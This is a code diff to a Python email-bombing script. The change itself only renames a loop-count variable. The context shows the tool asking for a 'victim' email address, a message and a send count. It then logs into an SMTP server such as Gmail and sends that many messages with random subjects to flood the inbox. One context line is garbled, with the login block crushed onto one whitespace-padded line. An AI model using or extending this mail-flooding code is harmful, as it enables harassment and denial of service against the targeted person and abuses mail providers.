@@ -16,7 +16,7 @@ print(" ")
 victim = raw_input('\033[94m[?]\033[97m The victim \033[91mEMAIL\033[97m : \033[93m')
 message = raw_input('\033[94m[?]\033[97m Your \033[92mMessage\033[97m : \033[93m')
 print(" ")
-hani = input('\033[94m[?] \033[97mNumber of \033[92msend\033[97m : \033[93m')
+number = input('\033[94m[?] \033[97mNumber of \033[92msend\033[97m : \033[93m')
 print(" ")
 print("\033[94m[*] \033[97mSending : ")
 ############################### SMTP_SERVER INFO ##################
@@ -25,7 +25,7 @@ port = 587
 
 ##########################  Login ############################                                                                                                                                        try:                                                                                                                                                                                                      server = smtplib.SMTP(smtp_server,port)                                                                                                                                                               server.ehlo()                                                                                                                                                                                         if smtp_server == "smtp.gmail.com":                                                                                                                                                                           server.starttls()                                                                                                                                                                             server.login(user,password)
 ###################### SENDING #########################################
-    for i in range(1, hani+1):
+    for i in range(1, number+1):
         subject = os.urandom(9)
         msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
         server.sendmail(user,victim,msg)
